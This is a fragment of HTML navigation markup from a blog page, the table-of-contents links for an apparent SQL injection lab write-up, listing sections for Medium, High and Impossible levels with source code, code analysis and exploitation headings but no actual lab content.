href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#medium-1" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Medium"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Medium<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#源代码-4" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="源代码"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->源代码<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#代码分析-4" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="代码分析"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->代码分析<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#漏洞利用-2" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="漏洞利用"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->漏洞利用<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#high-1" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="High"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->High<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#源代码-5" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="源代码"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->源代码<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#代码分析-5" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="代码分析"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->代码分析<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#漏洞利用-3" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="漏洞利用"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->漏洞利用<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#impossible-1" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="Impossible"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Impossible<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#源代码-6" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="源代码"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->源代码<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/blog/blogs/xxbj/Web_Security/Lab7_SQL_Injection.html#代码分析-6" class="router-link-active router-link-exact-active link page-catalog-item page-catalog-item" aria-label="代码分析"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->代码分析<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--]--></ul></div></main><!--]--></div></div><!--[--><!----><!----><!--]--><!--]--></div>
    <script type="module" src="/blog/assets/app-Dh5bFHR3.js" defer></script>
  </body>
</html>
